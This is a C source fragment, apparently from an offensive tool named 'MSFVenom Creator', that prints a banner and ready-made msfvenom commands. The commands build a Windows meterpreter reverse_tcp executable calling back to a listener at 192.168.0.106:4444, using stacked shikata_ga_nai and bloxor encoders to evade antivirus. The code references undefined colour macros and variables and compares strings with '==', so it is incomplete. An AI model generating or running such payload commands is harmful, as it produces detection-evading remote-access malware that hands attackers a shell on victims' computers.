#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define clear() printf("\033[H\033[J")

void banner()
{

	system("clear");

        printf(yellow) ; 
	printf(" ==========================================================================\n");
	printf(Green) ; 
	printf(" MSFVenom Creator Coded By ViralKitten") ;
	printf(yellow); 
	printf("          _                        \n");
	printf("   _  _ _ __   __    _                          \\`*-.                    \n");
	printf("  || //////_) //_\\  //                           )   _`-.                 \n");
	printf("  ||//////  \\//   \\//__                         .  : `. .                \n");
	printf("  =====================                         : _   '  \\               \n");
	printf("                   _  _ _____________ ___  __   ; *` _.   `*-._          \n");
     	printf("                  //_/ // //  // /-  //|| //    `-.-'          `-.       \n");
     	printf("                 //  \\// //  // /__ // ||//       ;       `       `.     \n");
     	printf("                ==========================        :.       .        \\    \n");
     	printf("                                                  . \\  .   :   .-'   .   \n");
     	printf("                                                  '  `+.;  ;  '      :   \n");
     	printf("                                                  :  '  |    ;       ;-. \n");
     	printf("                                                  ; '   : :`-:     _.`* ;\n");
     	printf("                                                .*' /  .*' ; .*`- +'  `*'\n");
	printf(Green);
	printf(" Meterpreter reverse payload creator");printf(yellow);
	printf("            `*-*   `*-*  `*-*'	\n");
	printf(yellow) ;
	printf(" ==========================================================================\n");
	
if (platformSelected =="quick")
{
	printf(Green) ; 
	printf(" Your payload examples:\n");
	printf(" With 1 encoder : \n");
	printf(white);		
	printf("%s"," msfvenom");
	printf(white);		
	printf("%s"," -p ");
	printf(BlueF);
	printf("%s","windows/meterpreter/");
	printf(red);
	printf("%s","reverse_tcp ");
	printf(white);
	printf("%s","LHOST=");
	printf(BlueF);
	printf("%s","192.168.0.106");
	printf(white);
	printf("%s"," LPORT=");
	printf(BlueF);
	printf("%s","4444 ");
	printf(white);
	printf("%s"," -a ");
	printf(BlueF);
	printf("%s","x86 ");
	printf(white);
	printf("%s","--platform ");
	printf(BlueF);
	printf("%s","windows");
	printf(white);
	printf("%s"," -e ");
	printf(BlueF);
	printf("%s","x86/shikata_ga_nai ");
	printf(white);
	printf("%s","-i ");
	printf(BlueF);
	printf("%s","4 ");
	printf(white);
	printf("%s","-n ");
	printf(BlueF);
	printf("%s","4 ");
	printf(white);
	printf("%s","--smallest -k -f ");
	printf(BlueF);
	printf("%s","exe ");
	printf(white);
	printf("%s","-o ");
	printf(BlueF);
	printf("%s","/root/payload.exe\n\n");
	
	printf(Green) ; 
	printf(" With 2 encoders : \n");	
	printf(white) ; 
	printf("%s"," msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -a x86 --platform windows -e x86/shikata_ga_nai -k -i 14 -n 4 ");
	printf(yellow);
	printf("%s","| msfvenom -a x86 --platform windows -i 22 -n 4 -e x86/bloxor --smallest ");
	printf(white);
	printf("%s","-f exe -o /root/payload.exe\n");
	
	printf(yellow) ;
	printf(" ==========================================================================\n");
		                                                                                             
		printf(white);
}
else{
	printf(Green) ; 
	printf(" Your payload builder:\n\n");
	printf(cyan);
	printf(" ");
	printf("%s",payloadBuild);
	printf("\n");
	printf(yellow) ;
	printf(" ==========================================================================\n");
	printf(white) ;
}
 /*    printf(yellow) ;
     printf("  _                        \n");
     printf("  \`*-.                    \n");
     printf("   )  _`-.                 \n");
     printf("  .  : `. .                \n");
     printf("  : _   '  \               \n");
     printf("  ; *` _.   `*-._          \n");
     printf("  `-.-'          `-.       \n");
     printf("    ;       `       `.     \n");
     printf("    :.       .        \    \n");
     printf("    . \  .   :   .-'   .   \n");
     printf("    '  `+.;  ;  '      :   \n");
     printf("    :  '  |    ;       ;-. \n");
     printf("    ; '   : :`-:     _.`* ;\n");
     printf(" .*' /  .*' ; .*`- +'  `*' \n");
     printf(" `*-*   `*-*  `*-*'	\n");
*/
	
}
